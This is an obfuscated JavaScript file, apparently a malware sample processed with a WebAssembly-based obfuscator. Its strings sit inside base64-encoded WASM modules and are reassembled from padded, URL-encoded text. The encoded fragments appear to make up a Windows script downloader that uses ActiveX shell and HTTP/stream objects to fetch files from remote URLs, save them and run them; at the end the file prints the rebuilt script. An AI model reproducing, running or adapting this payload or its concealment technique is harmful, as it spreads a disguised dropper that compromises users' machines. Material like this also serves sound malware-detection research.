const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGvICAgAAKfwBBAQt/AEGwBAt/AEHoCAt/AEHSDQt/AEG6Egt/AEHgFgt/AEHiFgt/AEHkFgt/AEHmFgt/AEH4FgsH2oCAgAALBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkLr5eAgAAKAEEBC60EZnVzdXp4bmNkY2NudHl3aWpyb2tzbmx4JTIwd3pkcWlsaXAocW9mZ3ZycXElMkNxbyUyMGpmZnhkbmFqJTJDYmolMjBrcnJucW5xZilpdCU3Qm1xJTIweGMlMjBkenZmbWFqd3J0ZyUyMGlrd21oc3ZkJTIwd3glM0R6ZiUyMHd5bm9lZXp0d3VkJTIwZGVBanNjdm90bmFpenR2em9lZGNYeW5PZ2tiZGtqc2JldWtjcHh0cGIoaGclMjJ2bFd1elNkZmNwa3J0a2lxa3BscXRrZy5rYVN3eGhpY2VscGxtemxlZiUyMm5pKW1kJTNCc2QlMjBqZCUyMHRidmdxYXhlcmVrJTIwdmNmbnZudHclMjBpdCUzRGtkJTIwYm53YXlzcXkuaXlFb2p4bWZwdXNhaGhudWZkeGlFb3VuYnh2b3VpemRyc3pvam9ubnVtbWhlemFuenl0bWFTZHF0Y3FycnhpZmZudHdndm9zZWMobGMlMjJidCUyNXlwVGZpRXdsTXVhUGVtJTI1bmolMjJpYSlybCUyMGh5JTJCeXclMjBub1NudHR6c3JkcmlldW5hdGdicC54bmZjbXJ6Y29naG15Y0Nha2hjcWFpcHJiZ0NyZ29kYWRhZ2V6cSh2dzl3YzJieSltYiUyMGZ4JTJCYW8lMjBmbmZnZ25wZCUzQmplJTIwZ3ElMjBjeXZzamFxcnJ4ZCUyMHN5eGlob3B3JTIweHIlM0R5egAAQbAEC7cEJTIwZXJuemtlYmN3bHQlMjBhaEFuY2NiYnR6YmlxdnZhc2Vya1hpcU9zY2JlempydWVnZ2NhdnR1cSh0YiUyMm1xTWl1U29rWHR3TXRvTGtyMmdjLmlhWHZzTXloTHFsSGhoVGx5VHRqUG1mJTIyamopa3glM0JvcSUyMGxjJTIwaGJ4amtvYngua3hvdmJuZWVyY3dlemlhdWRkbnp5amhzYWV0dmNhZW50cHhlZ2Vjc3BoeHFhcG1uamJnZ2xla3olMjBjdSUzRGZvJTIwZGtmbWp1dm9ubW5jZGV0d29pb25veHBuYW4lMjBoZyhhbSlnbyU3Qm5mJTIwbmYlMjB6YyUyMGhmJTIwamFpaWVmZWYlMjB1ZihqcXhreW9qbi5sa3JmdmVvZmFpdmRhbXlyalNudHR0dWFnZXRtemVhaSUyMGtnJTNEeWklM0RsbCUzRHZzJTIwYng0dnApZ20lN0JzbyUyMG1uJTIwcXQlMjBydyUyMGpzJTIwanclMjBjb3ZtamFweHJuciUyMGF1eGtyYWR2JTIwcXIlM0RjZCUyMGVvbnNoZW5xd2RrJTIwcHVBY2Fjd2l0dmhpamN2YnVlbWxYeXBPZ2diaGlqY3VlZ2Jjenp0cGsoa2MlMjJubEFqYkRzdE9nZERrbEJjZi5qY1NpcHR1dnJ5ZWVpZmFraG1oaiUyMnJ1KWp3JTNCZnklMjB0diUyMGFyJTIwZXYlMjBuaSUyMHh4JTIwc3J4b3QAAEHoCAvpBGFiZC5sa29ubnBnbWVwZW5mYihmeSlhdCUzQndlJTIwd3AlMjBucyUyMG9nJTIwcXclMjBndSUyMGZveHF1YXJiLmFqdHpmeWJkcHJsZXpkJTIwcW0lM0RueiUyMGt1MXd0JTNCeGMlMjB1YyUyMHF2JTIwbGElMjBvdSUyMHBmJTIwZGl4bHNhaWkuc2R3cGJycW9peWt0eG9ldnQodGh4ZndveGgubmRSb3JldWtzbGFwbXpvdGxubnRzaG5lbGJCZWpvZHNkZW95Y2MpbWUlM0JpYSUyMHd3JTIwaHYlMjBucSUyMHhrJTIwZGUlMjBzYXh5bmFxcC5zaHBkbG9vb3Nla2lpeHRodmlkbG9qbm50dSUyMHh4JTNEamElMjB4dDBzcyUzQnZsJTIwYXolMjBwdSUyMHprJTIwcmUlMjB3YyUyMGNseGlxYWl4LnFjc2drYW1kdmxpZWJ0VHVtb2VxRnVmaXl2bGtqZWV5KGRpZmFhbnh3JTJDZnQlMjBmajJ6ZClhciUzQmJ2JTIwdmQlMjByeCUyMG5wJTIwbXklMjBxaiUyMHRieGRpYWZ2Lmx2Y2JpbHByb3pmc2FmZWduKHJpKW94JTNCYmklMjBkaiUyMGRjJTIwcnAlMjBqeCU3RGxxJTIwc3IlMjBkYiUyMHFzJTIweWElM0JkdiUyMHFiJTIwcmwlN0RqaSUyMGZqJTIweGklM0JmeCUyMG1nJTIwcXl0dHFyenZ5YXAlMjBlaiU3QnhzJTIwc3klMjBzYyUyMHBrJTIwZGh4ZmJvam0ucHRvZGVwZnZlc21uemUoc2IAAEHSDQvnBCUyMmxjR2x5RW5sVHBzJTIycnAlMkNqbiUyMHdpZm54cnFhJTJDZ3olMjB3bmZnamFjZWx1ZHNndWVvdyl1dCUzQnRxJTIwc3glMjBkYyUyMG1wJTIweGl4YnFvdXcueGpzenhlYXJuZ3lkdncodGMpanUlM0JnYSUyMGF1JTIweXQlMjB1dCUyMG93aWV6ZmluJTIwY2goeWdyY2NucWUlMjBiZSUzRWN4JTIwbXgwcG0paWQlN0J2byUyMGNmJTIwYWYlMjB0eSUyMHdhJTIwdHMlMjBwYndiaXN5ei5kZVJjdnV5Ym52Zih6amZpZm5mdyUyQ2htJTIwY3oweWElMkNwbiUyMGFuMGV2KXR6JTNCdnQlMjB2YiUyMGFxJTIwbXclMjBzaSU3RGx4JTIwamUlMjB4aiUyMHl6JTIwcHQlM0J5ZCUyMHRnJTIwaG0lN0RiayUyMG5pJTIwdWhjbm9hcG90dm1jdGdoanolMjB5eihxamVqdnJvbSl1bCU3QnJyJTIwbHYlMjB4diU3RHpyJTIwc2YlMjByeiUzQmN0JTdEZ2tkbXNsd2EoeGElMjJobGh0eXRzc3RiaXB3bSUzQWdwJTJGYXUlMkZqbmJ1aGl1bWdtYmJuaGF0cWdhaXR3ZXJoa2VuZ3Z0d2V5eXJscC52eGN0d29sZG1ycCUyRmxoaXNjbWRtZ3ZmJTJGZGdzbGhjdHNyb2VpcWxwcWV0YXAucmZwcnJoY29wdHclM0Z4YmlhcmJuY2RxaDF6bi5rZmpzcXBtcGdzaCUyMnBhJTJDa3clMjB6byUyMnVlMWp3AABBuhILpQQyaW83eXk0eng5bGwwZ201Ym0uYmVlb294eGplY3clMjJzdiUyQ216JTIwYXkxdnkpdW8lM0J5a2Rremx6ayh5YyUyMnNwaHVndGlhdHpncG9oJTNBeGwlMkZwbiUyRnFzYmZoaW5qZ29yYnFoYWtpZ2t0dHlncnVyZXhjdmdqZW15cnVyLmxrY3Z5b3pvbWt6JTJGdnppeGZtZHZnamslMkZzcHNneWN0bHJtcWl5enBvd3RuZy5sbXBmeGhxdXBmeSUzRmJxaWhiYmVrZHFoMnp3LnlnanpscGxiZ2J6JTIyd2clMkN0dCUyMGx5JTIyYXE0d3QyaHo3anQzb3EycW4waXk1eWUubXRlYWl4b2plemElMjJuciUyQ3J3JTIwdmExZmEpbGUlM0JqemR2cGxqeCh6YiUyMndpaGl4dGVrdHd6cHlzJTNBYnIlMkZsaiUyRnd0Yml4aXVxZ3dsYnRkYXRvZ2dvdGZrcmd2ZXpudmZmZWhicmNwLnVuY2tpb3RibWJmJTJGd2hpcHFta2dneGslMkZhb3NueGN6aXJqeWl6Y3B5eHRnYS5mcHBtcmhxanB5ZSUzRmViaWhhYmhhZHVsM3pjLmV4anJxcHBwZ2ttJTIydmIlMkNweiUyMGNrJTIyZnkyYmYzc3Q1enE0ZGc4cGU2d3Q5Y3oueGRlZXF4c3NlY2clMjJoaiUyQ29qJTIwY2sxdWQpYnIlM0JuZAAAQeAWCwEAAEHiFgsBAABB5BYLAQAAQeYWCxF6bHplemx6dnpsemF6bHpsAABB+BYLAQA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var rlyvy = lS(0, 0);
var sxhxgo = lS(0, 1);
var mbfqg = lS(0, 2);
var mbcef = lS(0, 3);
var lkuv = lS(0, 4);
var owwkjhoblj = rlyvy + sxhxgo + mbfqg + mbcef + lkuv;
var axbmfdvkp = lS(0, 5);
var jxjvbdslxq = 3;
var ctnnznjx = owwkjhoblj.split(lS(0, 6));
var dhtjgwteqf = lS(0, 7);
(() => {
    i = 0;
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return i < ctnnznjx.length ? 1 : 0;
            },
            update: () => {
                i += jxjvbdslxq;
            },
            body: () => {
                {
                    axbmfdvkp = axbmfdvkp + ctnnznjx[i];
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
var dhtjgwteqf = lS(0, 8).split(dhtjgwteqf).join(lS(0, 9));
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                print(axbmfdvkp);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();